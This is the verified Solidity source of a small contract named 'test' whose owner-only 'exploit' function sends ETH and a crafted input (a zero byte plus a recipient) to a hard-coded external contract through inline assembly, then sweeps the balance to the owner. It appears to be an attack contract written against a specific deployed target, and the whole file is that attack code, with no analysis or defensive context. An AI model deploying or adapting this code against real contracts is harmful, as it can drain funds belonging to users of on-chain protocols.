/**
 *Submitted for verification at Arbiscan.io on 2024-06-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract test {
    address payable private owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function exploit(bytes memory recipient) public payable {
        require(msg.sender == owner);

        bytes memory input = abi.encodePacked("\x00", recipient);
        uint input_size = 1 + recipient.length;
        uint256 amountToSend = msg.value;

        assembly {
            let success := call(
                gas(), // gas available
                0xe9217bc70b7ed1f598ddd3199e80b093fa71124f, // address to call
                amountToSend, // value to send from Solidity variable
                add(input, 32), // input data start position
                input_size, // size of the input data
                0, // output data start position
                0  // size of the output data
            )
            if iszero(success) { revert(0, 0) }
        }

        owner.transfer(address(this).balance);
    }


}